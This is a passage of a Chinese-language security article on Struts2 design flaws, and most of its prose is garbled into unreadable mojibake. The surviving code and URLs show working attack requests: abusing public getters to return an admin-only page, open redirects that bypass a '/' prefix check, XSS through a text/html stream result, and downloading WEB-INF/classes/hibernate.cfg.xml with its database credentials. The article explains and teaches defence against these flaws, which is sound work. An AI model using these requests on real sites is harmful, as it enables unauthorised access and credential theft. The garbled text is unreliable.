åœ¨æ²¡æœ‰struts2çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¦åœ¨servletçš„dogetæˆ–è€…dopostæ–¹æ³•ä¸­ï¼Œå†™ifåˆ¤æ–­ç­‰ä»£ç ï¼Œæ‰èƒ½è®©ç”¨æˆ·è°ƒç”¨å…¶ä»– servletä¸­çš„æ–¹æ³•ï¼Œç°åœ¨çœ‹æ¥å…¶å®è¿™ä¹Ÿæ˜¯ä¸€ç§ä¿æŠ¤æªæ–½ã€‚è€Œç°åœ¨struts2ä¸ºäº†æ–¹ä¾¿å¼€å‘ï¼ŒæŠŠæ‰€æœ‰çš„publicæ–¹æ³• ç»Ÿä¸€æ˜ å°„äº†å‡ºå»ï¼Œå¯¼è‡´å¼€å‘æŠŠä¸€ä¸ªç»å¸¸ä½¿ç”¨çš„åŠŸèƒ½ï¼Œä¹ æƒ¯å†™æˆä¸€ä¸ªpublicçš„æ–¹æ³•ï¼Œç°åœ¨å±…ç„¶æˆäº†ä¸¥é‡æ¼æ´ã€‚</p>
<h3 id="struts2-action-">struts2çš„actionå±æ€§è®¾è®¡ç¼ºé™·</h3>
<p>å†å›å¤´çœ‹çœ‹æˆ‘ä»¬åœ¨actionä¸­çš„å±æ€§å®šä¹‰ï¼Œä½ ä¼šå‘ç°ï¼Œç°åœ¨ä»–ä»¬éƒ½æˆäº†æ¼æ´ï¼Œå› ä¸ºstruts2è§„å®šå±æ€§çš„getå’Œ setæ–¹æ³•ï¼Œéƒ½å¿…é¡»æ˜¯publicçš„ã€‚ é‚£ä¹ˆæˆ‘ä»¬å®šä¹‰äº† private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } è¿™æ®µä»£ç çš„æ—¶å€™ï¼Œå®é™…ä¸Šï¼Œæ˜¯å†™äº†ä¸¤ä¸ªpublicçš„æ–¹æ³•ã€‚ é‚£è¿™ä¸¤ä¸ªè¡¨é¢ä¸Šæ²¡æœ‰ä»»ä½•å®è´¨å«ä¹‰çš„æ–¹æ³•ï¼Œä¼šæœ‰ä»€ä¹ˆå®‰å…¨éšæ‚£å‘¢ï¼Ÿ è¿™éœ€è¦å’Œå‰æ–‡è”ç³»èµ·æ¥ï¼Œå‰æ–‡æåˆ°ï¼Œæˆ‘ä»¬åœ¨struts.xmlæ–‡ä»¶ä¸­ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š <action name="user" class="net.inbreak.UserAction"> <result name="success">user/userlist.jsp</result> <result name="addUser">user/addUser.jsp</result> <result name="added">user/added.jsp</result> <result name="false">user/false.jsp</result> </action> è¿™æ®µä»£ç å«ä¹‰æ˜¯ï¼ŒUserActionä¸­ï¼Œä»»ä½•ä¸€ä¸ªæ–¹æ³•æ‰§è¡Œåï¼Œå¦‚æœè¿”å›çš„æ˜¯successè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œ å°±ä¼šæŠŠ user/userlist.jspè¿”å›ç»™ç”¨æˆ·ã€‚ å¦‚æœè¿”å›æ˜¯addUserï¼Œå°±ä¼šæŠŠuser/addUser.jspè¿”å›ç»™ç”¨æˆ·ã€‚ ç°åœ¨UserActionæ˜¯ç®¡ç†ç”¨æˆ·çš„é¡µé¢ï¼Œåœ¨æˆ‘ä»¬çš„ç³»ç»Ÿä¸­ï¼Œæœ‰æ™®é€šç®¡ç†å‘˜å’Œè¶…çº§ç®¡ç†å‘˜ï¼Œä»–ä»¬çš„åŒºåˆ«æ˜¯æ™®é€šç®¡ç†å‘˜ å¯ä»¥æŸ¥çœ‹ç”¨æˆ·ï¼Œä½†æ˜¯ä¸èƒ½æ·»åŠ ä¸€ä¸ªç”¨æˆ·ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬åœ¨UserActionä¸­ï¼Œå†™äº† public String addUser(){ if(true){ //äº‹å®ä¸Šè¿™é‡Œæ˜¯ä¸ªè¶…çº§ç®¡ç†å‘˜çš„åˆ¤æ–­ï¼Œæˆ‘å·æ‡’äº†ã€‚ return &quot;false&quot;; } return &quot;addUser&quot;; } è¿™ä¸ªæ–¹æ³•çš„ä»£ç åˆ¤æ–­äº†ä¸å…è®¸æ™®é€šç®¡ç†å‘˜è®¿é—®ï¼Œä½†æ˜¯user/addUser.jspè¿™ä¸ªjspé¡µé¢ä¸­å¹¶æ²¡æœ‰è¿™ä¸ªåˆ¤æ–­é€»è¾‘ã€‚ å› ä¸ºå¼€å‘è®¤ä¸ºåªæœ‰è¿”å›addUserçš„æ—¶å€™ï¼Œæ‰ä¼šæ¥åˆ°è¿™ä¸ªé¡µé¢ï¼Œè€Œè¦è¿”å›addUserï¼Œåˆ™å¿…é¡»é€šè¿‡è¶…çº§ç®¡ç†å‘˜çš„éªŒè¯ã€‚ é‚£æˆ‘ä»¬èƒ½è®©ä¸€ä¸ªæ–¹æ³•è¿”å›addUserä¹ˆï¼Ÿå½“ç„¶å¯ä»¥ï¼ <a href="http://www.inbreak.net/app/user!getUsername.action?username=addUser">http://www.inbreak.net/app/user!getUsername.action?username=addUser</a> è¿™ä¸ªé“¾æ¥ï¼Œstruts2ä¼šæ€ä¹ˆå¤„ç†å‘¢ï¼Ÿ ä»–ä¼šæ‰¾struts.xmlä¸­ï¼Œå¯¹åº”æ®µè·¯å¾„userï¼Œäºæ˜¯æ‰¾åˆ°äº†å¯¹åº”çš„å¤„ç†Actionï¼ˆnet.inbreak.UserActionï¼‰ï¼Œ ç”±äºè·¯å¾„ä¸­æœ‰äº†â€œ!getUsernameâ€ï¼Œäºæ˜¯å°±å»æ‰¾è¿™ä¸ªActionä¸­çš„getUsernameè¿™ä¸ªæ–¹æ³•ï¼Œå¾ˆæ˜æ˜¾ï¼Œè¿™ä¸ªæ–¹æ³•å…¶å® æ˜¯usernameè¿™ä¸ªå±æ€§çš„getæ–¹æ³•ï¼Œå¦‚æœä½ è¦è®©Actionæ¥æ”¶ç”¨æˆ·æäº¤çš„usernameï¼Œä½ å°±å¿…é¡»è¦å®šä¹‰è¿™ä¸ªæ–¹æ³•ã€‚ é‚£è¿™ä¸ªæ–¹æ³•ä¼šè¿”å›ä»€ä¹ˆå‘¢ï¼Ÿä¼šè¿”å›actionçš„å­—æ®µusernameçš„å€¼ï¼å“ˆå“ˆï¼usernameç”¨æˆ·å·²ç»æäº¤ç»™actionäº†ï¼Œ é“¾æ¥åé¢å†™ç€â€œ?username=addUserâ€ï¼Œstruts2æŠŠè¿™ä¸ªå€¼èµ‹äºˆäº†actionä¸­çš„usernameå±æ€§ã€‚é‚£è¿™é‡Œè¿”å›çš„å½“ç„¶ å°±æ˜¯â€œaddUserâ€ï¼ <img src="" alt=""> ä¸€ç³»åˆ—å·§åˆåï¼Œå¯¼è‡´ç°åœ¨ç»™ç”¨æˆ·è¿”å›äº†user/addUser.jspé¡µé¢ï¼Œè¿™æ˜¯ä¸€ä¸ªæ·»åŠ ç”¨æˆ·çš„è¡¨å•é¡µé¢ï¼Œå¹¶ä¸”ç”¨æˆ·æ²¡ æœ‰å»èµ°éªŒè¯æ˜¯å¦ä¸ºè¶…çº§ç®¡ç†å‘˜è¿™ä¸€æ­¥ã€‚ ç°åœ¨ç”¨æˆ·çœ‹åˆ°äº†ä¸€ä¸ªæ·»åŠ ç”¨æˆ·çš„é¡µé¢ï¼Œä»–æœ‰ä¸¤ç§æ”»å‡»æ€è·¯ï¼š 1ï¼Œç›´æ¥æäº¤ï¼Œå¦‚æœå¤„ç†ç”¨æˆ·æäº¤çš„é‚£ä¸ªactionæ²¡æœ‰å†æ¬¡åˆ¤æ–­ç”¨æˆ·èº«ä»½ï¼Œé‚£å°±æäº¤æˆåŠŸäº†ã€‚ 2ï¼Œå¦‚æœä»–åˆ¤æ–­äº†ç”¨æˆ·èº«ä»½ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥csrfä»–ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“äº†è¿™ä¸ªactionçš„åœ°å€ï¼Œå’Œå®ƒéœ€è¦çš„å‚æ•°ï¼ ç”±äºstruts2çš„actionå’Œjspæ–‡ä»¶åˆ†ç¦»ï¼Œå¯¼è‡´å¼€å‘äººå‘˜å¾€å¾€ä¼šåœ¨actionçš„æ–¹æ³•ä¸­ï¼Œæ‰§è¡Œæƒé™åˆ¤æ–­ï¼Œè€Œjspé¡µé¢ä¸­ å¹¶æ²¡æœ‰å†æ¬¡æ‰§è¡Œè¿™ä¸ªåˆ¤æ–­ï¼Œä»–ä»¥ä¸ºactionåˆ¤æ–­å°±å¤Ÿäº†ã€‚è€Œååactionçš„å±æ€§ï¼Œç»™æˆ‘ä»¬å¸¦æ¥äº†ä¸€ä¸ªå¯è‡ªå®šä¹‰è¿”å› resultçš„æ–¹æ³•ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ç»•è¿‡actionè®¿é—®jspé¡µé¢ã€‚</p>
<h3 id="struts2-result-redirect-">Struts2çš„é‚£äº›resultç±»å‹ç¼ºé™·ï¼ˆredirectï¼‰</h3>
<p>åˆšæ‰æˆ‘ä»¬é¢†æ•™äº†struts2ç»™æˆ‘ä»¬å¸¦æ¥é‚£äº›å±æ€§çš„å¥½å¤„ï¼Œç°åœ¨æˆ‘ä»¬å†å¾€åèµ°ä¸€æ­¥ï¼Œç ”ç©¶Actionæ–¹æ³•çš„è¿”å›ç»“æœã€‚ å…¶å®å¹¶ä¸æ˜¯åªç”±Stringç±»å‹çš„è¿”å›ç»“æœï¼Œstruts2è¿˜æœ‰å…¶ä»–ç±»å‹çš„è¿”å›ï¼Œæ¯”å¦‚â€œredirectâ€ç±»å‹ã€‚ <action name="test" class="net.inbreak.TestAction"> <result name="false">user/false.jsp</result> <result name="redir" type="redirect">${redirecturl}</result> </action> è¿™æ®µä»£ç ï¼Œå¤§å®¶å”¯ä¸€å¯èƒ½çœ‹ä¸æ‡‚çš„ï¼Œå°±æ˜¯type=&quot;redirect&quot;äº†ã€‚ è¿™æ˜¯ä¸€ä¸ªurl redirectçš„æ–¹å¼ï¼Œstruts2ä¸ºäº†æ–¹ä¾¿å¤§å®¶å¼€å‘ï¼ŒæŠŠâ€œè‡ªå®šä¹‰302è·³è½¬åˆ°å…¶ä»–urlâ€è¿™ç§æ–¹å¼ç»™åŒ…è£…äº† èµ·æ¥ã€‚åªè¦å¦‚ä¸Šå®šä¹‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨actionä¸­å†™æ–¹æ³•ï¼š public String redirect() { return &quot;redir&quot;; } ç„¶åå®šä¹‰å±æ€§ private String redirecturl; å½“ç”¨æˆ·æ‰“å¼€ <a href="http://www.inbreak.net/app/test!redirect.action?redirecturl=/a.jsp">http://www.inbreak.net/app/test!redirect.action?redirecturl=/a.jsp</a> çš„æ—¶å€™ï¼Œå°±ä¼š302è·³è½¬åˆ° <a href="http://www.inbreak.net/app/a.jsp" target="_blank">http://www.inbreak.net/app/a.jsp</a> è¿™æ˜¯å¾ˆå¸¸è§çš„urlè·³è½¬åº”ç”¨ï¼Œåœ¨struts2ä¸­ï¼Œå¦‚ä¸Šé…ç½®ä¸€ä¸‹ï¼Œå°±å¯ä»¥å®ç°ã€‚ ç›¸ä¿¡æ˜çœ¼äººéƒ½çœ‹å‡ºæ¥äº†ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œå­˜åœ¨urlè·³è½¬æ¼æ´ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥äº† <a href="http://www.inbreak.net/app/test!redirect.action?redirecturl=http://www.ph4nt0m.org" target="_blank">http://www.inbreak.net/app/test!redirect.action?redirecturl=http://www.ph4nt0m.org</a> å°±ä¼šè·³è½¬åˆ°<a href="http://www.ph4nt0m.orgè¿™ä¸ªé’“é±¼ç½‘ç«™(-_-!)ã€‚é‚£ä¹ˆå¦‚ä½•é˜²å¾¡å‘¢ï¼Ÿ" target="_blank">http://www.ph4nt0m.orgè¿™ä¸ªé’“é±¼ç½‘ç«™(-_-!)ã€‚é‚£ä¹ˆå¦‚ä½•é˜²å¾¡å‘¢ï¼Ÿ</a> è¦é˜²å¾¡urlè·³è½¬åˆ°é’“é±¼ç½‘ç«™ï¼Œæˆ‘ä»¬è‚¯å®šéœ€è¦ä¸€ä¸ªç™½åå•æœºåˆ¶ï¼Œæˆ–è€…æ ¹æœ¬å°±è®©ä»–è·³è½¬åˆ°æœ¬ç«™ä¸‹ã€‚äºæ˜¯æœ‰äº†å¦‚ä¸‹åˆ¤æ–­ï¼š public String redirect() { if(redirecturl.startsWith(&quot;/&quot;)) { return &quot;redir&quot;; } return &quot;false&quot;; } å¯èƒ½ä½ çœ‹å‡ºæ¥äº†ï¼Œä»…ä»…åˆ¤æ–­&quot;/&quot;å¼€å¤´ï¼Œå…¶å®æ˜¯ä¸èƒ½æœç»urlè·³è½¬æ¼æ´çš„ï¼Œå› ä¸º <a href="http://www.inbreak.net/app/test!redirect.action?redirecturl=//www.ph4nt0m.org" target="_blank">http://www.inbreak.net/app/test!redirect.action?redirecturl=//www.ph4nt0m.org</a> ä¸€æ ·ä¼šè·³è½¬ã€‚è€Œåœ¨è¿™é‡Œå´è¶³å¤Ÿäº†ï¼Œå› ä¸ºstruts2å·²ç»æ¥ç®¡äº†è¿™ä¸ªè¿‡ç¨‹ï¼Œåªè¦ä»¥â€œ/â€å¼€å¤´ï¼Œç»Ÿç»Ÿå…ˆç»™ä½ è‡ªåŠ¨åŠ ä¸Š æœ¬åœ°åŸŸåï¼ŒæŠ“åŒ…åï¼Œä½ ä¼šçœ‹åˆ° location: <a href="http://www.inbreak.net/app//www.ph4nt0m.org" target="_blank">http://www.inbreak.net/app//www.ph4nt0m.org</a> å®é™…ä¸Šæ˜¯ä¸ä¼šæœ‰é—®é¢˜çš„ã€‚ struts2ä¹Ÿè®¤ä¸ºè¿™æ ·åˆ¤æ–­ä¸ä¼šæœ‰é—®é¢˜äº†ï¼Œç„¶è€Œç”¨æˆ·è¾“å…¥ <a href="http://www.inbreak.net/app/test!getStr.action?str=redir&amp;redirecturl=http://www.ph4nt0m.org" target="_blank">http://www.inbreak.net/app/test!getStr.action?str=redir&amp;redirecturl=http://www.ph4nt0m.org</a> <img src="" alt=""> å…¶å®å‰ç¯‡å·²ç»åˆ†æè¿‡äº†ï¼Œè¿™æ ·å°±åˆ©ç”¨actionä¸­çš„strå±æ€§ï¼Œç»•è¿‡äº†å¿…é¡»ä»¥â€œ/â€å¼€å¤´çš„åˆ¤æ–­ï¼Œç›´æ¥è·³è½¬äº†ã€‚ testé‡Œæœ‰ä¸ªstrå±æ€§ï¼Œå¯è‡ªå®šä¹‰è¿”å›ï¼Œè¿™é‡Œè‡ªå®šä¹‰äº†â€œredirâ€ï¼Œæ‰€ä»¥æ¥åˆ°äº† <result name="redir" type="redirect">${redirecturl}</result> è€Œredirecturlçš„å€¼ï¼Œä¹Ÿæäº¤ç»™äº†actionï¼Œæ‰€ä»¥è·³è½¬äº†ã€‚</p>
<h3 id="struts2-result-ajax-">Struts2çš„é‚£äº›resultç±»å‹ç¼ºé™·ï¼ˆAjaxï¼‰</h3>
<p>åœ¨struts2ä¸­ä½¿ç”¨ajaxï¼Œä¹Ÿæ˜¯è¢«struts2æ”¯æŒçš„ï¼Œå®ƒæä¾›äº†ä¸€ç§è¿”å›ç±»å‹ï¼Œå«åšâ€œstreamâ€ã€‚åœ¨ç ”ç©¶è¿™ä¸ª resultçš„ä½¿ç”¨æ—¶ï¼Œä½œè€…çœ‹åˆ°ä¸€æœ¬ä¹¦ï¼Œå«åšã€Š Struts 2æƒå¨æŒ‡å—ï¼šåŸºäºWebWorkæ ¸å¿ƒçš„MVCå¼€å‘ ã€‹ã€‚è¿™æœ¬ä¹¦éå¸¸ å‡ºåï¼Œå‡ ä¹æ‰€æœ‰çš„struts2ä½¿ç”¨è€…éƒ½æ¨èä½¿ç”¨ã€‚ <a href="http://book.csdn.net/bookfiles/479/index.html" target="_blank">http://book.csdn.net/bookfiles/479/index.html</a> ä¹¦ä¸Šä»‹ç»ajaxå¯ä»¥è¿™ä¹ˆä½¿ç”¨ï¼š é…ç½®struts.xml <action name="ajaxtest" class="net.inbreak.ajax.TestajaxAction"> <result type="stream"> <param name="contentType">text/html</param> <param name="inputName">input</param> </result> </action> ä¹‹åå†™TestajaxActionï¼š public InputStream input; public String execute() throws Exception{ input = new StringBufferInputStream(&quot;aaaa<td><script>alert(&quot;kxlzx&quot;)</script>aa&quot;); return SUCCESS; } å…¶å®å¤§å®¶éƒ½çœ‹å‡ºæ¥æˆ‘çš„æ„æ€äº†ï¼Œè¿”å›äº†contentTypeä¸ºâ€œtext/htmlâ€çš„é¡µé¢ï¼Œå†…å®¹ä¸º aaaa<td><script>alert(&#39;kxlzx&#39;)</script>aa ç»“æœæµè§ˆå™¨è§£æçš„æ—¶å€™ï¼Œå‡ºç°äº†XSSæ¼æ´ã€‚ æœ¬æ¥é»˜è®¤çš„contentTypeæ˜¯text/plainï¼Œä¸éœ€è¦é…ç½®ï¼Œå¦‚æœç”¨æˆ·ç›´æ¥æ‰“å¼€ï¼Œåªä¼šçœ‹åˆ°ä¸€ä¸ªStreamï¼Œä¸ä¼šè§£æ å…¶ä¸­çš„htmlå’Œjsã€‚ç°åœ¨ä¹¦ä¸Šä»‹ç»è¯´è¦å†™æˆè¿™æ ·ï¼Œä¸çŸ¥é“ä½œè€…æ˜¯å¦çŸ¥é“è¿™ä¸ªæ•™ç¨‹å¯¹å¤§å®¶çš„å½±å“ï¼Œç»“æœå·²ç»è¯¯å¯¼äº† å¤§æ‰¹çš„å¼€å‘äººå‘˜ã€‚ äº‹å®ä¸Šï¼Œè¿™ä¸æ˜¯strutsçš„é—®é¢˜ï¼Œæ˜¯strutsâ€œæƒå¨â€æ•™ç¨‹çš„é—®é¢˜ã€‚æƒå¨çš„æ•™ç¨‹ï¼Œä¸€æ—¦å‡ºç°å®‰å…¨æ¼æ´ï¼Œå¾€å¾€ä¼š è¯¯å¯¼å¤§æ‰¹çš„å¼€å‘äººå‘˜ï¼Œä¸çŸ¥é“å¤§å®¶åœ¨æŒ–æ¼æ´çš„æ—¶å€™ï¼Œæ˜¯å¦æ³¨æ„åˆ°äº†è¿™ç‚¹ï¼Œç‰¹åˆ«æ˜¯å½“å®˜æ–¹çš„DEMOå‡ºç°æ¼æ´ï¼Œ é‚£ç»å¯¹æ˜¯æƒŠå¤©åœ°æ³£é¬¼ç¥çš„æ‚²å‰§ã€‚</p>
<h3 id="struts2-result-">Struts2çš„é‚£äº›resultç±»å‹ç¼ºé™·ï¼ˆè‡ªå®šçš„é¡µé¢ï¼‰</h3>
<p>æœ‰æ—¶å€™ï¼Œå¼€å‘äººå‘˜ä¸ºäº†æ–¹ä¾¿ï¼Œå–œæ¬¢é…ç½®struts.xmlå¦‚ä¸‹ï¼š <action name="test" class="net.inbreak.TestAction"> <result name="success">user/test.jsp</result> <result name="testpro">user/testproperty.jsp</result> <result name="redir" type="redirect">${redir}</result> <result name="testloadfilepath">${testloadfilepath}</result> <result name="false">user/redirfalse.jsp</result> <result name="input">user/input.jsp</result> </action> è¯·æ³¨æ„ï¼Œå…¶ä¸­ä¸€æ¡resultï¼Œåç§°æ˜¯â€testloadfilepathâ€ï¼Œ ${testloadfilepath}çš„ä½œç”¨æ˜¯è‡ªå®šä¹‰çš„jspé¡µé¢ åœ°å€ï¼Œæ¥æ”¶sessionæˆ–requestä¸­ä¼ è¿‡æ¥çš„è¿™ä¸ªå˜é‡çš„å€¼ã€‚é‚£ä¹ˆç”¨æˆ·æäº¤ <a href="http://www.inbreak.net/app/test.action?testloadfilepath=user/test.jsp">http://www.inbreak.net/app/test.action?testloadfilepath=user/test.jsp</a> å½“ç„¶å°±ä¼šè¿”å›user/test.jspé¡µé¢ï¼Œéå¸¸çš„çµæ´»ã€‚è™½ç„¶å¹¶ä¸æ˜¯æ‰€æœ‰çš„å¼€å‘éƒ½ä¼šè¿™ä¹ˆåšï¼Œä½†æ˜¯ä¸€æ—¦å‡ºç°è¿™ç§æƒ…å†µï¼Œ ä¼šäº§ç”Ÿä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ <a href="http://www.inbreak.net/app/test!getRedir.action?redir=testloadfilepath&amp;testloadfilepath=WEB-INF/classes/hibernate.cfg.xml" target="_blank">http://www.inbreak.net/app/test!getRedir.action?redir=testloadfilepath&amp;testloadfilepath=WEB-INF/classes/hibernate.cfg.xml</a> ä¸çŸ¥é“å¤§å®¶çœ‹æ‡‚è¿™æ®µurlçš„å«ä¹‰æ²¡æœ‰ï¼Œå…ˆè°ƒç”¨getRedirï¼Œå¯ä»¥è‡ªå®šä¹‰è¿”å›åˆ°testloadfilepathï¼Œè€Œtestloadfilepath å·²ç»æŒ‡å®šäº†WEB-INF/classes/hibernate.cfg.xmlã€‚WEB-INFç›®å½•ä¸‹ï¼Œéƒ½æ˜¯å—webå®¹å™¨ä¿æŠ¤çš„ä¸œè¥¿ï¼Œé»˜è®¤ä¸å…è®¸ ç›´æ¥requestç›¸å¯¹åœ°å€æ¥è®¿é—®ã€‚è¯¥ç›®å½•é‡Œé¢æœ‰ç¨‹åºç¼–è¯‘åçš„classæ–‡ä»¶ï¼ˆå¯ä»¥è¢«ç›´æ¥åç¼–è¯‘ä¸ºjavaæºç ï¼‰ï¼Œ æœ‰æ•°æ®åº“é…ç½®æ–‡ä»¶ç­‰æ•æ„Ÿæ–‡ä»¶ï¼Œç°åœ¨æ‰“å¼€å¦‚ä¸Šurlï¼Œç›´æ¥è¢«ä¸‹è½½äº†hibernate.cfg.xmlï¼Œè¿™é‡Œæ”¾ç€æ•°æ®åº“ç”¨æˆ·å å’Œå¯†ç ã€‚ <img src="" alt=""> è¿™æ ·ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä¸‹è½½ä½ çš„æ‰€æœ‰æºä»£ç ï¼Œæ‰€æœ‰æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚strutsåœ¨æä¾›ç»™æˆ‘ä»¬è¿™ç§æ–¹å¼çš„æ—¶å€™ï¼Œ å¹¶æ²¡æœ‰ä»»ä½•å®˜æ–¹è¯´æ˜è¿™é‡Œæœ‰å±é™©ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªä¸å®šæ—¶ç‚¸å¼¹ã€‚</p>
<h3 id="struts2-taglib-">Struts2çš„taglibè®¾è®¡ç¼ºé™·</h3>
<p>ç»è¿‡å‡ ä¸ªä¾‹å­ä¸‹æ¥ï¼Œä¸çŸ¥é“å¤§å®¶æ³¨æ„åˆ°æ²¡æœ‰ï¼Œä»ç”¨æˆ·è¾“å…¥èµ°åˆ°è¿™é‡Œï¼Œå·²ç»èµ°åˆ°äº†è¾“å‡ºè¿™ä¸€æ­¥äº†ã€‚struts2çš„ é‚£äº›resultçš„typeï¼Œå…¶å®å°±æ˜¯å‡ ç§è¾“å‡ºæ–¹å¼ï¼Œæœ‰jspã€ajaxã€redirectï¼Œç»è¿‡jsonpluginç­‰æ’ä»¶é…ç½®ï¼Œè¿˜å¯ä»¥ æ”¯æŒå…¶ä»–è¾“å‡ºæ–¹å¼ã€‚ç”šè‡³æ”¯æŒä¸€äº›æ ‡ç­¾åº“ï¼Œæ¯”å¦‚freemarkerç­‰æ ‡ç­¾åº“ã€‚ä¸è¿‡æˆ‘ä»¬åªè°ˆstruts2è‡ªå¸¦çš„æ ‡ç­¾åº“ï¼Œ åœ¨ä¸€ä¸ªjspé¡µé¢çš„æœ€ä¸Šæ–¹ï¼Œå†™ä¸Šä¸€æ®µä»£ç ï¼Œå°±å¯ä»¥ä½¿ç”¨struts2æä¾›çš„æ•°æ®è¾“å‡ºå’Œé¡µé¢æ•°æ®æ“ä½œçš„æ ‡ç­¾äº†ã€‚ æ¯”ä»¥å¾€æˆ‘ä»¬åœ¨jspè¾“å‡ºâ€œ&lt;%=name%&gt;â€è¦æ–¹ä¾¿çš„å¤šï¼Œä¸‹é¢ç»™ä¸ªä¾‹å­ï¼š test.jspä»£ç  &lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt; <s:property value="username"/> ç¬¬ä¸€è¡Œæ˜¯å‘Šè¯‰strutsè¿™é‡Œè¦ä½¿ç”¨strutsçš„æ ‡ç­¾åº“ï¼Œç¬¬äºŒè¡Œå°±æ˜¯ä¸€ä¸ªæ ‡ç­¾çš„ä½¿ç”¨ï¼Œå«ä¹‰æ˜¯è¾“å‡ºusernameçš„å€¼ï¼Œ usernameä¼šä»sessionã€requestã€pageç­‰åœ°æ–¹å–ï¼Œè¿™é‡Œä¸å…³æ³¨å–æ•°æ®çš„æ¬¡åºã€‚</p>
<h3 id="struts2-taglib-struts2-0-escapejavascript-">struts2çš„taglibè®¾è®¡ç¼ºé™·ï¼ˆstruts2.0ä¸æ”¯æŒescapeJavaScriptï¼‰</h3>
<p>è¯´åˆ°è¾“å‡ºï¼Œå¤§å®¶éƒ½èƒ½æƒ³åˆ°XSSæ¼æ´ï¼Œé‚£ä¹ˆä½œä¸ºä¸€ä¸ªæµè¡Œæ¡†æ¶ï¼Œstruts2åœ¨è¿™é‡Œåšäº†ä»€ä¹ˆæ§åˆ¶å‘¢ï¼Ÿ struts2.0å¯¹éƒ¨åˆ†æ ‡ç­¾åšäº†é»˜è®¤çš„htmlescapeï¼š åˆšæ‰é‚£ä¸ªæ ‡ç­¾å®é™…ä¸Šæ•ˆæœç­‰äº <s:property value="username" escape="true"/> åˆ«ä»¥ä¸ºåšäº†htmlescapeå°±å¤Ÿäº†ï¼Œè¾“å‡ºåœ¨javascriptä¸­çš„æ—¶å€™ï¼Œè¿˜ä¼šå‡ºç°xssæ¼æ´ã€‚æ‰€ä»¥strutsåœ¨2.1.6è¿™ä¸ªç‰ˆæœ¬ ä¹Ÿæ”¯æŒäº†javascriptescapeï¼š struts2.1.6ï¼š <s:property value="pass" escape="true" escapeJavaScript="false"/> é»˜è®¤å¼€å¯å¦‚ä¸Šæ‰€ç¤ºï¼Œå½“ä½ è¦è¾“å‡ºåˆ°jsä¸­çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨escapeJavaScriptè¿›è¡Œè½¬ä¹‰ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦ä½ ç¡®å®šè¿™ä¸ªstrutsæ˜¯2.0çš„ï¼Œåªè¦å¼€å‘äººå‘˜æŠŠå˜é‡è¾“å‡ºåˆ°jsä¸­ï¼Œåæœ‰å…«ä¹ä¼šå‡ºxssé—®é¢˜ã€‚</p>
<h3 id="struts2-taglib-">struts2çš„taglibè®¾è®¡ç¼ºé™·ï¼ˆæ²¡æœ‰å¯Œæ–‡æœ¬å®‰å…¨è¾“å‡ºæ ‡ç­¾ï¼‰</h3>
<p>è€ŒåŒ…æ‹¬æœ€é«˜ç‰ˆæœ¬2.1.8åœ¨å†…ï¼Œä»ç„¶æ²¡æœ‰æ”¯æŒå¯Œæ–‡æœ¬å®‰å…¨è¾“å‡ºï¼Œè¿™æ˜¯ä¸€ä»¶æ‚²å‰§çš„äº‹æƒ…ï¼Œå¦‚æœç”¨strutså¼€å‘ä¸€ä¸ª å¤§ä¼—blogçš„åº”ç”¨ï¼Œåˆæ”¯æŒå¯Œæ–‡æœ¬çš„æ–‡ç« ï¼Œå¼€å‘äººå‘˜åªèƒ½æŠŠhtmlescapeå’Œjsescapeéƒ½å»æ‰ï¼Œæ‰èƒ½ä¿è¯ä¸šåŠ¡æ­£å¸¸ è¿è¡Œï¼Œæ‰€ä»¥å¯¼è‡´äº†XSSæ¼æ´ã€‚</p>
<h3 id="struts2-taglib-htmlescape-">struts2çš„taglibè®¾è®¡ç¼ºé™·ï¼ˆå¹¶ä¸æ˜¯æ‰€æœ‰è¾“å‡ºæ ‡ç­¾éƒ½åšäº†é»˜è®¤çš„htmlescapeï¼‰</h3>
<p>æœ‰å‡ ä¸ªæ ‡ç­¾æ˜¯ä¸åšhtmlescapeçš„ï¼Œæ¯”å¦‚ <s:a> <s:text> <s:url> è¿™å…¶å®æ˜¯ä¸€ä¸ªä¸¥é‡é™·é˜±ï¼Œå› ä¸ºåªè¦æåˆ°struts2ï¼Œå‰è¾ˆä»¬éƒ½ä¼šå‘Šè¯‰ä½ ï¼Œæ”¾å¿ƒä½¿ç”¨ï¼Œå®ƒé»˜è®¤åšäº†htmlescapeã€‚ é‚£æ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´ä¸€äº›æ ‡ç­¾æ²¡æœ‰åšé»˜è®¤çš„escapeå‘¢ï¼Ÿä½œè€…ç¿»äº†ä¸‹æºç ï¼Œä¹Ÿæ²¡æœ‰æ‰¾å‡ºå…·ä½“åŸå› ï¼Œä¸çŸ¥é“é‚£äº›äºº æ˜¯æ€ä¹ˆæƒ³çš„ã€‚ å¹¶ä¸”ï¼Œç»è¿‡ç®€å•çš„fuzzï¼Œå‘ç°åœ¨ç‰¹å®šç¯å¢ƒä¸‹ï¼Œé‚£äº›åšäº†è¾“å‡ºè½¬ä¹‰çš„æ ‡ç­¾ä¹Ÿä¼šå‡ºç°é—®é¢˜ã€‚ æˆ‘ä»¬çŸ¥é“é»˜è®¤çš„htmlescapeæ˜¯ä¸è½¬ä¹‰å•å¼•å·çš„ï¼Œæ‰€ä»¥ï¼Œå½“strutsæ ‡ç­¾åº“çš„æºç ä¸­ï¼Œå‡ºç°ä¸€äº›æ ‡ç­¾å±æ€§çš„è¾“å‡º æ—¶ï¼Œå¦‚æœæ ‡ç­¾å±æ€§çš„å‘¨å›´ä½¿ç”¨çš„æ˜¯å•å¼•å·ï¼Œè€Œæ”»å‡»è€…åˆèƒ½æ§åˆ¶æ 